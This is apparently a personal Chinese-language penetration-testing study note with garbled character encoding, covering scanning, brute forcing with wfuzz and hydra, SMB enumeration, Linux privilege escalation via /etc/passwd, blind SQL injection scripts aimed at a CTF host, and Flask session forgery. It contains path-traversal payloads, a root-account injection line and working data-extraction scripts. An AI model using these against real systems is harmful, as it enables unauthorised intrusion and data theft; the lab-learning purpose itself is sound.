# æ¸—é€

## 1.ä¿¡æ¯æ”¶é›†

### 1ï¼‰ä¸»æœºå‘ç°

ä½¿ç”¨nmapæ‰«æä¸»æœºï¼Œxx.xx.xx.0/24

arp-scan -l æ‰«æåŒä¸€ä¸ªç½‘æ®µå­˜åœ¨çš„ä¸»æœºï¼Œé€Ÿåº¦éå¸¸å¿«

### 2)ç«¯å£æ‰«æ

nmap -p æŒ‡å®šç«¯å£å·ï¼Œ-p- æ‰«æ0-65535 ï¼› -sS æŸ¥çœ‹è¿è¡Œçš„æœåŠ¡ï¼Œ -svæŸ¥çœ‹è¿è¡Œçš„è½¯ä»¶ç‰ˆæœ¬

å¸¸è§çš„ç«¯å£æ”»å‡»http://www.hackdig.com/01/hack-576819.htm

### 3ï¼‰ç›®å½•æ‰«æ

dirb dirsearchæ‰«æç›®å½•

nikto -host åœ°å€ï¼› host åå¯è·Ÿ ip åœ°å€ï¼Œä¹Ÿå¯è·ŸåŸŸå url çš„å½¢å¼ï¼Œä¾‹å¦‚ï¼šé»˜è®¤æ‰«æä¼šç›®æ ‡80ç«¯å£ï¼Œhttpåè®®ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å‚æ•°ä½¿å¾—niktoå¯¹ç›®æ ‡httpsåè®®ï¼Œ443ç«¯å£è¿›è¡Œæ‰«æï¼Œå¹¶æ£€æŸ¥ ssl ä¸€äº›å¸¸è§çš„é—®é¢˜

`nikto -host http://172.168.1.105 -ssl -port 443`

æœ‰æ—¶å€™æˆ‘ä»¬åªéœ€è¦æ‰«æç½‘ç«™ä¸‹çš„æŸä¸ªå­ç›®å½•ï¼Œä½¿ç”¨-c å‚æ•°æŒ‡å®šæ‰«æçš„ç›®å½•ï¼Œä½¿ç”¨-c all å¯è¿›è¡Œç›®å½•çˆ†ç ´ï¼Œå¹¶æ‰«æ

```ABAP
nikto -host http://192.168.1.7 -c /dvwa
```





**æ–‡ä»¶æ‰«æ**



â€‹		å‚æ•°fuzz

â€‹		

## 2.çˆ†ç ´fuzz

### **1ï¼‰wfuzz**

[ä½¿ç”¨è¶…çº§è¯¦ç»†å‚è€ƒ](http://t.zoukankan.com/-qing--p-11624494.html)

wfuzz åŸºæœ¬ä½¿ç”¨

**è·¯å¾„æˆ–æ–‡ä»¶fuzz**

```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ

wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php
```

**urlå‚æ•°ä¸­çš„fuzz**

```
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```

**æ¨¡ç³ŠPOSTè¯·æ±‚**ï¼Œæ¯”å¦‚è´¦å·å¯†ç çˆ†ç ´ï¼Œ

å¦‚æœæ‚¨æƒ³æ¨¡ç³Šä¸€äº›è¡¨å•ç¼–ç çš„æ•°æ®ï¼ˆä¾‹å¦‚HTMLè¡¨å•ï¼‰ï¼Œåªéœ€ä¼ é€’-då‘½ä»¤è¡Œå‚æ•°å³å¯ï¼š

```
wfuzz -z file,/usr/share/wfuzz/wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp
```

cookieè¯·æ±‚ -bå‚æ•°

è¦å°†è‡ªå·±çš„cookieå‘é€åˆ°æœåŠ¡å™¨ï¼Œä¾‹å¦‚ï¼Œå°†è¯·æ±‚ä¸HTTPä¼šè¯ç›¸å…³è”ï¼Œå¯ä»¥ä½¿ç”¨-bå‚æ•°ï¼ˆå¯¹å„ç§cookieé‡å¤ï¼‰ï¼š

```
$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ
```

åœ¨çˆ†æ–‡ä»¶åçš„å‚æ•°çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯Linuxæ“ä½œç³»ç»Ÿï¼Œå¯ä»¥å°è¯•æŠŠå€¼è®¾ä¸º**/etc/passwd**   å½“è¯¥å€¼ä½œä¸ºå‚æ•°ä¼ é€’æ—¶ï¼Œå¯ä»¥åŠ ../../../ï¼Œå¦åˆ™æ‰“ä¸å¼€ã€‚ä¸¾ä¾‹ï¼š

`wfuzz -b 'SL_G_WPT_TO=eo; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; PHPSESSID=3huujdf706d35tq0i36020kb18' -w /usr/share/wfuzz/wordlist/general/common.txt --hw 100 http://172.16.12.161/manage.php?FUZZ=../../../../../etc/passwd`

### **2ï¼‰bpæŠ“åŒ…çˆ†ç ´**

### 3ï¼‰ä¹å¤´è›‡ï¼ˆhydraï¼‰åè®®è´¦å·å¯†ç çˆ†ç ´

å‡ ä¹æ”¯æŒæ‰€æœ‰åè®®çš„åœ¨çº¿ç ´è§£ï¼›[ä½¿ç”¨æ–¹æ³•](https://blog.csdn.net/weixin_42350212/article/details/116419960?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166626512816782395382196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166626512816782395382196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116419960-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=hydra&spm=1018.2226.3001.4187)

æ”¯æŒç ´è§£ftp http https è·¯ç”±å™¨ http-proxy  smb   Windowsè¿œç¨‹æ¡Œé¢ é‚®ç®±pop3  telnetç ´è§£  è¯­éŸ³é€šè®¯å·¥å…·teamspeak  cisco......

```undefined
è¯­æ³•ï¼šHydra å‚æ•° IP æœåŠ¡
```

ä¸¾ä¾‹ï¼Œç ´è§£sshç™»å½•è´¦å·å¯†ç ï¼Œå…¶ä¸­å‚æ•°è¯¦è§£è§ä½¿ç”¨æ–¹æ³•ï¼Œ-L æŒ‡å®šå­—å…¸ï¼Œå°å†™-l ç›´æ¥æŒ‡å®šæŸä¸ªusername ï¼›-PåŒç†ï¼Œ-t çº¿ç¨‹ï¼›

`hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh`

### 4ï¼‰enum4linuxæšä¸¾å·¥å…·

**åœ¨smbåè®®å­˜åœ¨æ—¶å¯èƒ½å¯ä»¥ä½¿ç”¨** [å‚è€ƒ](https://blog.csdn.net/qq_63844103/article/details/127219997?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166633608316800182710217%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166633608316800182710217&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127219997-null-null.142^v59^pc_rank_34_2,201^v3^control_1&utm_term=enum4linux&spm=1018.2226.3001.4187)

SMBæ˜¯ä¸€ä¸ªåè®®åï¼Œå…¨ç§°æ˜¯**Server Message Block**ï¼ˆæœåŠ¡å™¨æ¶ˆæ¯å¿«åè®®ï¼‰ï¼Œç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…ç”±å®ƒå®ç°ã€‚ä¸€èˆ¬**å…±äº«æ–‡ä»¶å¤¹**å’Œ**æ‰“å°æœº**ä½¿ç”¨è¾ƒå¤šï¼Œsmbçš„é»˜è®¤ç«¯å£å¯èƒ½æ˜¯**139**æˆ–è€…**445**ï¼Œå…¶å·¥ä½œçš„ç«¯å£ä¸å…¶ä½¿ç”¨çš„åè®®æœ‰å…³ã€‚

Enum4linuxæ˜¯ç”¨äºæšä¸¾windowså’ŒLinuxç³»ç»Ÿä¸Šçš„SMBæœåŠ¡çš„å·¥å…·ã€‚å¯ä»¥è½»æ¾çš„ä»ä¸**SMBæœåŠ¡**æœ‰å…³çš„ç›®æ ‡ä¸­å¿«é€Ÿæå–ä¿¡æ¯ã€‚

å®æˆ˜ä¸­æœ€å¸¸ç”¨çš„å…¶å®ä¹Ÿå°±æ˜¯ä½¿ç”¨**-a**æŒ‡ä»¤ï¼Œè¿›è¡Œä¸€æ¬¡å¤§èŒƒå›´ä¿¡æ¯æ¢æµ‹ï¼ŒæŒ‡ä»¤å¦‚ä¸‹

```css
enum4linux -a -o ip
```

ä¸¾ä¾‹ï¼šEMPIRE: BREAKOUT

é€šè¿‡æŸ¥çœ‹æºç å¾—åˆ°ä¸€ä¸ªå¯†ç ï¼›ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åï¼Œnmap å‘ç°å…¶å¼€æ”¾äº†è¿™å‡ ä¸ªå‘½ä»¤ï¼Œå…¶ä¸­æœ‰139,445ä¸¤ä¸ªç«¯å£ï¼Œæ‹¥æœ‰smbï¼Œå°±å¯ä»¥ä½¿ç”¨

![image-20221021152327586](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021152327586.png)

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021152652134.png" alt="image-20221021152652134" style="zoom:33%;" />

enum4linux -a 172.16.12.162 æšä¸¾ç”¨æˆ·åï¼›

















## 3.æ¼æ´åˆ©ç”¨

## 4.æƒé™æå‡

Linuxæƒé™æå‡å‚è€ƒhttps://zhuanlan.zhihu.com/p/408153639

https://www.sohu.com/a/587131612_121217831 [ææƒå°æŠ€å·§åˆé›†](https://www.sohu.com/a/587131612_121217831)

ä¿¡æ¯æ”¶é›†ï¼šsudo -l æŸ¥çœ‹æ™®é€šç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„rootæƒé™æœ‰å“ªäº›ï¼›history æŸ¥çœ‹æ™®é€šç”¨æˆ·åšäº†äº›ä»€ä¹ˆå‘½ä»¤ï¼›ls -a æŸ¥çœ‹å½“å‰æ™®é€šæˆ·ä¸‹çš„æ‰€æœ‰ä¸œè¥¿ï¼›find æŸ¥æ‰¾ ã€uname -a æŸ¥çœ‹æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬

### 1.Linuxç‰ˆæœ¬è„ç‰›ææƒ

### 2.sudoææƒ

### 3.SUIDææƒ

æŸ¥çœ‹SUIDç¨‹åºï¼š

```bash
find / -perm -u=s -type f 2>/dev/null
æˆ–è€…
find / -perm -4000 -type f 2>/dev/null
```

è¿™ä¸ªå‘½ä»¤ä¼šåœ¨æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢ï¼Œæ‰¾å‡ºæ‹¥æœ‰ SetUID ä½è®¾ç½®çš„æ‰€æœ‰æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶åœ¨æ‰§è¡Œæ—¶å°†å…·æœ‰æ‹¥æœ‰è€…çš„æƒé™ï¼Œè€Œä¸æ˜¯æ‰§è¡Œè€…çš„æƒé™ã€‚æ„æ€è¯´æˆ‘å¯ä»¥é€šè¿‡æ‰§è¡Œå…¶ä¸­æ‹¥æœ‰è€…ï¼ˆroot)çš„æ–‡ä»¶æ¥è·å¾—æ‹¥æœ‰è€…çš„æƒé™ï¼ˆroot)











### 3.crontabå®šæ—¶ææƒ

### 4./etc/passwd ä¸­UID GIDææƒï¼›

éœ€è¦å¯ä»¥æ›´æ”¹/etc/passwdå†…å®¹çš„æƒé™

å½“å¯ä»¥ä¿®æ”¹/etc/passwd çš„å†…å®¹æ—¶ï¼Œæœ€ç®€å•çš„ææƒå°±æ˜¯è¿™ä¸ªï¼›root ç”¨æˆ·çš„UIDå’ŒGIDéƒ½ä¸º0ï¼Œåè¿‡æ¥å¯ä»¥æ ¹æ®è¿™ä¸ªæˆä¸ºroot ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ·»åŠ ä¸€ä¸ªç”¨æˆ·åœ¨/etc/passwd é‡Œé¢çš„UID & GIDéƒ½æ˜¯0çš„è¯ï¼Œé‚£ä¹ˆå®ƒçš„**æƒé™å°±æ˜¯rootï¼Œå› æ­¤è¾¾åˆ°æƒé™æå‡**ï¼›

ä¸¾ä¾‹ï¼šDC9 é¶æœºææƒï¼š

é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ™®é€šç”¨æˆ·æŸ¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªç¨‹åºï¼šusage ï¼špython test.py read append 

<img src="C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220045809.png" alt="image-20221020220045809" style="zoom:33%;" />



usage æ³¨é‡Šï¼Œread è¡¨ç¤ºå¯ä»¥è¯»ï¼Œappendè¡¨ç¤ºå¯ä»¥æ·»åŠ ï¼Œé‚£ä¹ˆå°±å¯ä»¥è”æƒ³åˆ°æ·»åŠ å†…å®¹åˆ°/etc/passwd

/etc/passwd å†…å®¹çš„æ ¼å¼ï¼š

![image-20221020220821445](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220821445.png)

![image-20221020220855884](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221020220855884.png)

äº†è§£è§„åˆ™ä¹‹åï¼Œåˆ™åœ¨/tmpç›®å½•ä¸‹ç”Ÿæˆè¿™ä¸ªç”¨æˆ·æ ¼å¼ï¼Œç„¶åä½¿ç”¨testè¿™ä¸ªç¨‹åºå°†å®ƒåŠ å…¥åˆ°/etc/passwd

`echo 'admin: $1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root: / bin/bash'>>/tmp/passwd`

ç„¶å`sudo ./test /tmp/passwd /etc/passwd` å°†ç”¨æˆ·æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨ `su admin`å°±åˆ‡æ¢åˆ°adminç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·å°±æ˜¯rootæƒé™

**å…¶ä¸­æ·»åŠ çš„ç”¨æˆ·æ ¼å¼ä¸­ï¼Œç”¨æˆ·å¯†ç æ˜¯xåˆ™ä»£è¡¨æ¥è‡ª/etc/shadow æ–‡ä»¶ä¸­ï¼Œå¦åˆ™éœ€è¦å°†å¯†ç è¿›è¡ŒhashåŠ å¯†å¹¶æ ¼å¼åŒ–ï¼šä½¿ç”¨kalié‡Œé¢çš„openssl:**



`openssl passwd -l -salt admin 123456`     -saltåŠ ç›å¤„ç†

### 5.getcap **-r / 2>/dev/null** && find / -perm -4000 2> /dev/null  æŸ¥æ‰¾è¯»å†™æƒé™æ–‡ä»¶ææƒ

å…³äºgetcap  æ‰§è¡Œæ‹¥æœ‰capabilitiesçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯èµ‹äºˆæ™®é€šç”¨æˆ·ä¸€äº›æƒé™çš„æ–‡ä»¶ï¼Œå‚è€ƒcapabilities

find / -perm -4000 2>/dev/null  è¯¦è§[ææƒå°æŠ€å·§åˆé›†](https://www.sohu.com/a/587131612_121217831)ï¼›

![image-20221021200755325](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021200755325.png)

ä½¿ç”¨

`find / -perm -4000 -type f 2>/dev/null` æ£€æŸ¥å¼±äºŒè¿›åˆ¶æ–‡ä»¶,ä½¿ç”¨[ä¸¾ä¾‹è§ææƒå°æŠ€å·§åˆé›†](https://www.sohu.com/a/587131612_121217831)

`getcap -r / 2>/dev/null`æŸ¥æ‰¾å¯¹è¢«è®¾ç½®äº†Capabilityçš„æ–‡ä»¶è¿›è¡Œæœå¯»ã€‚

ä¸¾ä¾‹ï¼š

![](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20221021201244377.png)

tarè¿™ä¸ªç¨‹åºâ€”â€”ç»¿è‰²é«˜äº®åŒºåŸŸæ˜¾ç¤º cap_dac_read_search å…è®¸è¯»å–ä»»ä½•æ–‡ä»¶ï¼Œ[ep](https://blog.csdn.net/alex_yangchuansheng/article/details/102830246?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-102830246-blog-123296652.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-102830246-blog-123296652.pc_relevant_aa&utm_relevant_index=4)ä»£è¡¨å¯ä»¥ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­¤å®ç”¨ç¨‹åºè¯»å–ä»»ä½•æ–‡ä»¶ï¼›ä¹Ÿå°±æ˜¯å°†æˆ‘ä»¬æƒ³æŸ¥çœ‹çš„æ–‡ä»¶ä½†æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œå°±å¯ä»¥ä½¿ç”¨tarå…ˆå‹ç¼©å†è§£å‹å°±å¯ä»¥è¯»å–äº†ï¼Œ[è¯¦ç»†è§](https://resources.infosecinstitute.com/topic/empire-breakout-vulnhub-ctf-walkthrough/)

è¿˜æœ‰ä¸€ä¸ªä¸¾ä¾‹è§[ææƒå°æŠ€å·§åˆé›†](https://www.sohu.com/a/587131612_121217831)

# æ¼æ´åˆ©ç”¨

## 1.sqlæ³¨å…¥

### 1ï¼‰å·¥å…·ä½¿ç”¨ä¹‹sqlmap

ä½¿ç”¨sqlmap æ¢ç´¢æ˜¯å¦å­˜åœ¨æ³¨å…¥:

æœ€åŸºæœ¬æ ¼å¼

getæ–¹å¼ï¼š

`sqlmap -u "url/?id=1"` 

postæ–¹å¼

`sqlmap -u "url" --data="xx"`æˆ–è€…`sqlmap -r post.txt`æ–‡ä»¶ä¸­ä¸ºæŠ“åŒ…çš„æ•°æ®ï¼Œå¯ä»¥è‡ªåŠ¨æ£€æµ‹å‚æ•°

cookie æ–¹å¼

`sqlmap -u â€œurlâ€œ --cookie=["xxx"] --level=2`

å…·ä½“å‚è€ƒ [é“¾æ¥â€”è¶…è¯¦ç»†ï¼ˆåŒ…å«sqlæ³¨å…¥é¶åœºæµ‹è¯•ä¾‹å­](https://blog.csdn.net/songbai220/article/details/109303110?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-109303110-blog-113835025.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-109303110-blog-113835025.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=3)

### [2ï¼‰æ—¶é—´ç›²æ³¨](https://blog.csdn.net/weixin_45488495/article/details/115558422?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167532589916800188563766%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167532589916800188563766&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-115558422-null-null.142^v72^insert_down4,201^v4^add_ask&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1018.2226.3001.4187)

è”åˆæŸ¥è¯¢ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œä»¥åŠå¸ƒå°”ç›²æ³¨ï¼Œéƒ½æ˜¯åŸºäºæ”»å‡»ç½‘ç«™ä¼šå›æ˜¾æ¶ˆæ¯ï¼Œæˆ–è€…å°†é”™è¯¯ä¿¡æ¯è¿”å›åœ¨å‰ç«¯ï¼Œæˆ–è€…ä¼šè¿”å›webé¡µé¢çš„æ­£ç¡®æˆ–é”™è¯¯

ä½†æ˜¯æœ‰æ—¶å€™ç½‘ç«™å…³é—­äº†é”™è¯¯å›æ˜¾æˆ–è¿‡æ»¤äº†æŸäº›å…³é”®å­—ï¼Œç½‘é¡µä¼šè¿”å›ä¸€ç§çŠ¶æ€([status](https://so.csdn.net/so/search?q=status&spm=1001.2101.3001.7020)ï¼Œåªè¦è¿›è¡Œäº†httpä¼ è¾“ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªçŠ¶æ€å€¼)ï¼Œè¿™æ—¶å€™å°±è¦ç”¨åˆ°æ—¶é—´ç›²æ³¨

æ—¶é—´ç›²æ³¨çš„åŸºæœ¬å‡½æ•°

if(1,2,3)ï¼šå¦‚æœ1ä¸ºTrueï¼Œåˆ™æ‰§è¡Œ2ï¼Œå¦åˆ™æ‰§è¡Œ3

sleep(x)ï¼šå»¶è¿Ÿxç§’ä¹‹åæ‰§è¡Œ

ascii(char)ï¼šå°†å­—ç¬¦è½¬æ¢ä¸ºå¯¹åº”çš„asciiç 

substr(str,pos,len)ï¼šå°†å­—ç¬¦ä¸²ä»posä½å¼€å§‹æˆªå–lené•¿åº¦

Benchmark(x,1)ï¼š æ‰§è¡Œè¡¨è¾¾å¼1ï¼Œxæ¬¡(æ¶ˆè€—CPU)

åŸºäºæ—¶é—´ç›²æ³¨çš„æ€è·¯

if() å‡½æ•°ï¼Œå¦‚æœå‚æ•°1ä¸ºçœŸï¼Œé‚£ä¹ˆæ‰§è¡Œå‚æ•°2(sleepå‡½æ•°)ï¼Œå¦åˆ™æ‰§è¡Œå‚æ•°3(ä¸€èˆ¬ä¸º1)

SELECT * FROM users WHERE id = 1 and if(1=1,sleep(6),1)

æ­¤æ—¶å¯ä»¥åœ¨navicatä¸Šçœ‹åˆ°æŸ¥è¯¢æ—¶é—´ï¼Œå½“1=1æ’ä¸ºçœŸï¼Œé‚£ä¹ˆæ‰§è¡Œsleep()å‡½æ•°ï¼›

andåè¦ç´§è·Ÿ true or false ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºfalseä¹‹åï¼Œå°±ç«‹å³æ‰§è¡Œå‚æ•°3ï¼Œæ‰€ä»¥ä¸€èˆ¬å‚æ•°3ä¸º1ï¼Œè¿™æ ·å°±å¯ä»¥æ­£ç¡®æŸ¥è¯¢andå‰çš„è¯­å¥

ä¸ºä»€ä¹ˆè¿”å›é¡µé¢æ²¡æœ‰å·®å¼‚

ç¬¬ä¸€ç§æƒ…å†µï¼šæ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½åªæ˜¾ç¤ºæ— ä¿¡æ¯é¡µé¢ï¼Œå¦‚ç™»å½•é¡µé¢ã€‚è¿™ç§æƒ…å†µä¸‹å¯èƒ½åªæœ‰ç™»å½•å¤±è´¥é¡µé¢ï¼Œé”™è¯¯é¡µé¢è¢«å±è”½äº†ï¼Œå¹¶ä¸”åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ï¼Œç™»å½•æˆåŠŸçš„é¡µé¢ä¸€èˆ¬æƒ…å†µä¹Ÿä¸çŸ¥é“ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹æœ‰å¯èƒ½åŸºäºæ—¶é—´çš„SQLæ³¨å…¥ä¼šæœ‰æ•ˆ

ç¬¬äºŒç§æƒ…å†µï¼šæ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½åªæ˜¾ç¤ºæ­£å¸¸ä¿¡æ¯é¡µé¢ã€‚ä¾‹å¦‚ï¼Œé‡‡é›†ç™»å½•ç”¨æˆ·ä¿¡æ¯çš„æ¨¡å—é¡µé¢ï¼Œé‡‡é›†ç”¨æˆ·çš„IPï¼Œæµè§ˆå™¨ç±»å‹ï¼Œreferå­—æ®µï¼Œsessionå­—æ®µï¼Œæ— è®ºç”¨æˆ·è¾“å…¥ä»€ä¹ˆï¼Œéƒ½æ˜¾ç¤ºæ­£å¸¸é¡µé¢

ç¬¬ä¸‰ç§æƒ…å†µï¼šå·®å¼‚é¡µé¢ä¸æ˜¯ç”±URLä¸­çš„SQLè¯­å¥æ¥å†³å®šçš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œä¹Ÿåªèƒ½ä½¿ç”¨åŸºäºæ—¶é—´ç›²æ³¨

åˆ¤æ–­æ³¨å…¥

payload

if(now() = sysdate(),sleep(6),0)

1.é€šè¿‡ä½¿ç”¨å‡ æ¬¡è¿™ä¸ªè¯­å¥æ”¹å˜sleepçš„æ—¶é—´ï¼Œæ¥è¯´æ˜å­˜åœ¨æ³¨å…¥

2.æœ‰çš„é¡µé¢æ˜¾ç¤ºçš„æœ‰éæ³•è¯·æ±‚ï¼Œä½†æ˜¯è¿™ç§å¾ˆå¯èƒ½å·²ç»å°†SQLè¯­å¥å¸¦å…¥æ•°æ®åº“æ‰§è¡Œäº†

3ï¼‰å¸ƒå°”ç›²æ³¨

è„šæœ¬ï¼š

```python
 	flag=''
 	url=''
 	payl = "' and if (ascii(substr(database(),{},1))>{},sleep(5),1) #"
    for i in range(1,length+1):
        low=32
        high=128
        mid=(low+high)//2
        while low<high:
            payload = paload_str.format(i,mid)
            print(payload)
            start_time=time.time()
            res=requests.get(url=url+payl)
            use_time=time.time()-start_time
            if use_time>5:
                low=mid+1
            else:
                high=mid
            mid=(low+high)//2
        print(chr(mid))
        flag+=chr(mid)
        print(flag)
```

### 3ï¼‰å¸ƒå°”ç›²æ³¨

> ## ***\*1.1ã€åŸç†ï¼š\****
>
> Boolç›²æ³¨é€šå¸¸æ˜¯ç”±äºå¼€å‘è€…å°†æŠ¥é”™ä¿¡æ¯å±è”½è€Œå¯¼è‡´çš„ï¼Œä½†æ˜¯ç½‘é¡µä¸­çœŸå’Œå‡æœ‰ç€ä¸åŒçš„å›æ˜¾ï¼Œæ¯”å¦‚ä¸ºçœŸæ—¶è¿”å›accessï¼Œä¸ºå‡æ—¶è¿”å›falseï¼›æˆ–è€…ä¸ºçœŸæ—¶è¿”å›æ­£å¸¸é¡µé¢ï¼Œä¸ºå‡æ—¶è·³è½¬åˆ°é”™è¯¯é¡µé¢ç­‰ã€‚ä¸éœ€è¦è¿”å›ç»“æœï¼Œä»…åˆ¤æ–­è¯­å¥æ˜¯å¦æ­£å¸¸æ‰§è¡Œ



> ## 1.2ã€åˆ¤æ–­ï¼š
>
> Boolç›²æ³¨ä¸­é€šå¸¸ä¼šé…å¥—ä½¿ç”¨ä¸€äº›åˆ¤æ–­çœŸå‡çš„è¯­å¥æ¥è¿›è¡Œåˆ¤å®šã€‚å¸¸ç”¨çš„å‘ç°Boolç›²æ³¨çš„æ–¹æ³•æ˜¯åœ¨è¾“å…¥ç‚¹åé¢æ·»åŠ and 1=1å’Œand 1=2ï¼ˆè¯¥Payloadåº”åœ¨æ€€ç–‘æ˜¯æ•´å‹æ³¨å…¥çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼‰ã€‚
>
> ------
>
> å¦‚æœé¢˜ç›®åç«¯æ‹¼æ¥äº†SQLè¯­å¥ï¼Œand 1=1ä¸ºçœŸæ—¶ä¸ä¼šå½±å“æ‰§è¡Œç»“æœï¼Œä½†æ˜¯and 1=2ä¸ºå‡ï¼Œé¡µé¢åˆ™å¯èƒ½ä¼šæ²¡æœ‰æ­£å¸¸çš„å›æ˜¾ã€‚

> ## 1.3ã€ç»•è¿‡ï¼š
>
> æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°å°†1=1è¿‡æ»¤æ‰çš„SQLæ³¨å…¥ç‚¹ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹å…³é”®å­—æ¥ç»•è¿‡è¿‡æ»¤ï¼Œæ¯”å¦‚å°†å…³é”®å­—ä¿®æ”¹ä¸ºä¸å¸¸è§çš„æ•°å€¼ï¼ˆå¦‚1352=1352ç­‰ï¼‰ã€‚
>
> ------
>
> åœ¨å­—ç¬¦ä¸²å‹æ³¨å…¥çš„æ—¶å€™æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡å•å¼•å·ï¼Œå°†Payloadä¿®æ”¹ä¸ºå¦‚ä¸‹æ ¼å¼'and'1'='1å’Œ'or'1'='2æ¥é—­åˆå•å¼•å·ï¼ˆç¬¬ä¸€ä¸ªå¼•å·é—­åˆåŸå¥ä¸­å¼•å·ï¼ŒåŸå¥ä¸­åé¢çš„å¼•å·æ‹¼æ¥åˆ°è¯­å¥ä¸­äº†ï¼‰

è„šæœ¬ï¼š

```python
import requests
import time

url = "http://e7ddd70b-0bce-40fb-b172-42bb976aeb7a.node4.buuoj.cn:81"
temp = {"stunum": ""}
column = ""
for i in range(1, 1000):
    time.sleep(0.6)
    low = 32
    high = 128
    mid = (low + high) // 2
    while (low < high):
        # åº“å
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1" %(i,mid)
        # è¡¨å
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
        # å­—æ®µå
        # temp["stunum"] = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),%d,1))>%d)^1" %(i,mid)
        # å†…å®¹
        temp["stunum"] = "1^(ascii(substr((select(group_concat(flag,value))from(flag)),%d,1))>%d)^1" % (i, mid)
        r = requests.get(url, params=temp)
        time.sleep(0.4)
        print(low, high, mid, ":")
        if "Hi" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 127):
        break
    column += chr(mid)
    print(column)

print("All:", column)
```



## 2.sessionä¼ªé€ 

sessionä¼ªé€ çš„å¿…è¦æ¡ä»¶æ˜¯è·å–Secret_KEY

åœ¨kalié‡Œé¢ï¼š

```
è§£ç ï¼š
python3  flask_session_cookie_manager3.py decode -s "å¯†é’¥" -c "session"

æ”¹ä½ è¦æ”¹çš„å†…å®¹ã€‚

åŠ å¯†ï¼špython3  flask_session_cookie_manager3.py encode -s "å¯†é’¥" -t "ä¸Šé¢è§£å¯†å‡ºçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼ˆä¸€èˆ¬ä¼ªé€ æ›´æ”¹åï¼‰"
```

æˆ–è€…è„šæœ¬ï¼š

```
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
